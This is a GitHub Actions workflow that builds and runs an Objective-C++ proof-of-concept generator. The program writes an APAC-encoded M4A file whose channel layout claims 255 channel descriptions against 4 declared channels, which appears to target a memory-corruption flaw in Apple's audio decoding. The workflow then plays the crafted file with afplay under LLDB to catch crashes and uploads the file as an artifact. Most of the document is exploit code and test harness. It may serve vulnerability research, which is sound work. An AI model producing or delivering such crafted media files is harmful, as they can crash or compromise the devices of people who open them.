name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l

      # Updated: Patch encodeme.mm to generate a malicious APAC file.
      - name: Patch encodeme.mm to generate malicious APAC file
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to generate a file with a malicious APAC channel layout..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #import <AudioToolbox/AudioToolbox.h>
          #include <string.h>
          #include <stdlib.h>

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

                  const char* fileName = "output_apac_poc.m4a";
                  CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,
                                                                   (CFStringRef)[NSString stringWithUTF8String:fileName],
                                                                   kCFURLPOSIXPathStyle, false);

                  // Define the audio format for APAC (Apple Positional Audio Codec)
                  AudioStreamBasicDescription asbd = {0};
                  asbd.mSampleRate = 48000;
                  asbd.mFormatID = 'apac'; // Use the specific APAC format ID
                  asbd.mFramesPerPacket = 1024;
                  asbd.mChannelsPerFrame = 4; // Lie: Claim there are only 4 channels here.

                  AudioFileID audioFile;
                  OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
                  if (status != noErr) {
                      fprintf(stderr, "AudioFileCreateWithURL failed: %d\n", status);
                      return 1;
                  }

                  // PoC: Create a malicious AudioChannelLayout with a mismatched number of descriptions.
                  // This is the core of the vulnerability.
                  size_t layoutSize = sizeof(AudioChannelLayout) + 255 * sizeof(AudioChannelDescription);
                  AudioChannelLayout *maliciousLayout = (AudioChannelLayout*)calloc(1, layoutSize);
                  maliciousLayout->mChannelLayoutTag = kAudioChannelLayoutTag_UseChannelDescriptions;
                  maliciousLayout->mNumberChannelDescriptions = 255; // The real lie: Claim there are 255 channels here.
                  
                  // Populate with dummy descriptions
                  for (int i = 0; i < 255; i++) {
                      maliciousLayout->mChannelDescriptions[i].mChannelLabel = kAudioChannelLabel_Mono;
                  }

                  // Set the malicious channel layout on the file. This is where the vulnerability is seeded.
                  status = AudioFileSetProperty(audioFile, kAudioFilePropertyChannelLayout, layoutSize, maliciousLayout);
                  if (status != noErr) {
                      fprintf(stderr, "AudioFileSetProperty (ChannelLayout) failed: %d\n", status);
                      AudioFileClose(audioFile);
                      free(maliciousLayout);
                      return 1;
                  }
                  
                  free(maliciousLayout);

                  // Write a small amount of dummy packet data to make the file valid enough to pass initial checks.
                  UInt32 numPacketsToWrite = 1;
                  char dummy_data[128] = {0};
                  status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), NULL, 0, &numPacketsToWrite, dummy_data);
                   if (status != noErr) {
                      fprintf(stderr, "AudioFileWritePackets failed: %d\n", status);
                  }

                  AudioFileClose(audioFile);
                  CFRelease(fileURL);

                  fprintf(stderr, "PoC: Wrote an APAC file with a mismatched channel layout.\n");
                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile encodeme.mm with debug symbols
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm with debug symbols (-g)..."
          clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_debug
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # New: Debug the generator itself to see why the property is rejected.
      - name: Debug APAC File Generation
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          GENERATOR_LOG_FILE="generator_debug_log.txt"
          echo "--- Debugging APAC File Generation Process ---" > $GENERATOR_LOG_FILE
          echo "Timestamp: $(date)" >> $GENERATOR_LOG_FILE

          echo "Creating LLDB script to trace AudioFileSetProperty..." > $GENERATOR_LOG_FILE
          cat > generator_debug_script.lldb << 'EOF'
          # Set a breakpoint just before the call that is failing
          breakpoint set --file encodeme.mm --line 53
          run
          # Now that we've hit the breakpoint, step into the function call
          # to see where in the framework the validation is happening.
          thread step-in
          # Get a backtrace from inside the framework function.
          bt
          continue
          quit
          EOF
          
          echo "Launching encodeme_debug under LLDB to trace the failing API call..." >> $GENERATOR_LOG_FILE
          lldb -s generator_debug_script.lldb -- ./encodeme_debug >> $GENERATOR_LOG_FILE 2>&1 || true

          echo "✅ Generator debug log created. Displaying contents:"
          cat $GENERATOR_LOG_FILE

      # Run and Verify File Generation (will likely fail, but we capture the log above)
      - name: Run and Verify File Generation
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          ./encodeme_debug
          echo "File 'output_apac_poc.m4a' generated."
          ls -l output_apac_poc.m4a
          
      # Launch the player directly under LLDB to catch any startup crashes
      - name: Launch Player Under LLDB to Catch Startup Crashes
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with malicious APAC file ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will stop if a crash occurs.
          run
          # If the process crashed, get the backtrace. If it exited normally, this shows the state at exit.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- afplay output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true

          echo "✅ Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts: the invalid M4A and both debug logs
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: audio-and-debug-artifacts
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/generator_debug_log.txt
            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
